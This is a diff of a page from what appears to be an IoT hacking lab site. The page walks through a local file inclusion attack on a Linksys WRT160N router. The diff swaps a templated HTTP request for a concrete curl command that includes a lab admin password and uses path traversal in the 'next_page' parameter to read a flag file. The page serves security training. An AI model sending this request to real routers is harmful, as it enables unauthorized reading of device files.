@@ -6,18 +6,18 @@
 <meta name=description content>
 <link rel=icon href=/images/favicon.png type=image/png>
 <title>Local File Inclusion :: IoT Hack Labs</title>
-<link href=/css/nucleus.css?1634759168 rel=stylesheet>
-<link href=/css/fontawesome-all.min.css?1634759168 rel=stylesheet>
-<link href=/css/hybrid.css?1634759168 rel=stylesheet>
-<link href=/css/featherlight.min.css?1634759168 rel=stylesheet>
-<link href=/css/perfect-scrollbar.min.css?1634759168 rel=stylesheet>
-<link href=/css/auto-complete.css?1634759168 rel=stylesheet>
-<link href=/css/atom-one-dark-reasonable.css?1634759168 rel=stylesheet>
-<link href=/css/theme.css?1634759168 rel=stylesheet>
-<link href=/css/tabs.css?1634759168 rel=stylesheet>
-<link href=/css/hugo-theme.css?1634759168 rel=stylesheet>
-<link href=/css/theme-red.css?1634759168 rel=stylesheet>
-<script src=/js/jquery-3.3.1.min.js?1634759168></script>
+<link href=/css/nucleus.css?1634762446 rel=stylesheet>
+<link href=/css/fontawesome-all.min.css?1634762446 rel=stylesheet>
+<link href=/css/hybrid.css?1634762446 rel=stylesheet>
+<link href=/css/featherlight.min.css?1634762446 rel=stylesheet>
+<link href=/css/perfect-scrollbar.min.css?1634762446 rel=stylesheet>
+<link href=/css/auto-complete.css?1634762446 rel=stylesheet>
+<link href=/css/atom-one-dark-reasonable.css?1634762446 rel=stylesheet>
+<link href=/css/theme.css?1634762446 rel=stylesheet>
+<link href=/css/tabs.css?1634762446 rel=stylesheet>
+<link href=/css/hugo-theme.css?1634762446 rel=stylesheet>
+<link href=/css/theme-red.css?1634762446 rel=stylesheet>
+<script src=/js/jquery-3.3.1.min.js?1634762446></script>
 <style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
 </head>
 <body data-url=/router-lab/wrt160n/local-file-inclusion/>
@@ -30,10 +30,10 @@
 <input data-search-input id=search-by type=search placeholder=Search...>
 <span data-search-clear><i class="fas fa-times"></i></span>
 </div>
-<script type=text/javascript src=/js/lunr.min.js?1634759168></script>
-<script type=text/javascript src=/js/auto-complete.js?1634759168></script>
+<script type=text/javascript src=/js/lunr.min.js?1634762446></script>
+<script type=text/javascript src=/js/auto-complete.js?1634762446></script>
 <script type=text/javascript>var baseurl="https://iot-hack-labs.github.io/"</script>
-<script type=text/javascript src=/js/search.js?1634759168></script>
+<script type=text/javascript src=/js/search.js?1634762446></script>
 </div>
 <section id=homelinks>
 <ul>
@@ -108,11 +108,6 @@ WRT160N
 <li data-nav-id=/router-lab/wrt160n/local-file-inclusion/ title="Local File Inclusion" class="dd-item active">
 <a href=/router-lab/wrt160n/local-file-inclusion/>
 Local File Inclusion
-</a>
-</li>
-<li data-nav-id=/router-lab/wrt160n/os-command-injection/ title="OS Command Injection" class=dd-item>
-<a href=/router-lab/wrt160n/os-command-injection/>
-OS Command Injection
 </a>
 </li>
 </ul>
@@ -206,46 +201,32 @@ Ultraloq-UL3
 Local File Inclusion
 </h1>
 <h2 id=local-file-inclusion>Local File Inclusion</h2>
-<p>Make an HTTP POST request to the router like the following:</p>
-<pre tabindex=0><code>POST /apply.cgi HTTP/1.1
-Host: {TARGET_IP}
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Proxy-Connection: keep-alive
-Authorization: Basic {BASE_64_CREDENTIALS}
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 181
-Connection: close
-
-submit_type=wsc_method2&amp;change_action=gozila_cgi&amp;next_page=../..{FILE}
-</code></pre><p><strong>NOTE:</strong> Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {FILE_TO_READ} with the valid IP, credentials, and file to read respectively</p>
-<p><img src=/static/WRT160N-LFI-Request.png alt="LFI Request">
-<img src=/static/WRT160N-LFI-Response.png alt="LFI Response"></p>
+<p>Run the following command to retrieve the flag:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl --user <span style=color:#e6db74>&#39;admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT&#39;</span> -X POST -d <span style=color:#e6db74>&#34;submit_type=wsc_method2&amp;change_action=gozila_cgi&amp;next_page=../../tmp/flag.txt&#34;</span> http://172.21.0.15:8080/apply.cgi
+</code></pre></div><p>The <code>next_page</code> parameter in the request specifies the file we want to read. The content of the file will be returned in the response.</p>
 <footer class=footline>
 </footer>
 </div>
 </div>
 <div id=navigation>
 <a class="nav nav-prev" href=/router-lab/wrt160n/ title=WRT160N> <i class="fa fa-chevron-left"></i></a>
-<a class="nav nav-next" href=/router-lab/wrt160n/os-command-injection/ title="OS Command Injection" style=margin-right:0><i class="fa fa-chevron-right"></i></a>
+<a class="nav nav-next" href=/btle-labs/ title="BTLE CTF" style=margin-right:0><i class="fa fa-chevron-right"></i></a>
 </div>
 </section>
 <div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
 <div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div>
 </div>
-<script src=/js/clipboard.min.js?1634759168></script>
-<script src=/js/perfect-scrollbar.min.js?1634759168></script>
-<script src=/js/perfect-scrollbar.jquery.min.js?1634759168></script>
-<script src=/js/jquery.sticky.js?1634759168></script>
-<script src=/js/featherlight.min.js?1634759168></script>
-<script src=/js/highlight.pack.js?1634759168></script>
+<script src=/js/clipboard.min.js?1634762446></script>
+<script src=/js/perfect-scrollbar.min.js?1634762446></script>
+<script src=/js/perfect-scrollbar.jquery.min.js?1634762446></script>
+<script src=/js/jquery.sticky.js?1634762446></script>
+<script src=/js/featherlight.min.js?1634762446></script>
+<script src=/js/highlight.pack.js?1634762446></script>
 <script>hljs.initHighlightingOnLoad()</script>
-<script src=/js/modernizr.custom-3.6.0.js?1634759168></script>
-<script src=/js/learn.js?1634759168></script>
-<script src=/js/hugo-learn.js?1634759168></script>
-<script src=/mermaid/mermaid.js?1634759168></script>
+<script src=/js/modernizr.custom-3.6.0.js?1634762446></script>
+<script src=/js/learn.js?1634762446></script>
+<script src=/js/hugo-learn.js?1634762446></script>
+<script src=/mermaid/mermaid.js?1634762446></script>
 <script>mermaid.initialize({startOnLoad:!0})</script>
 </body>
 </html>
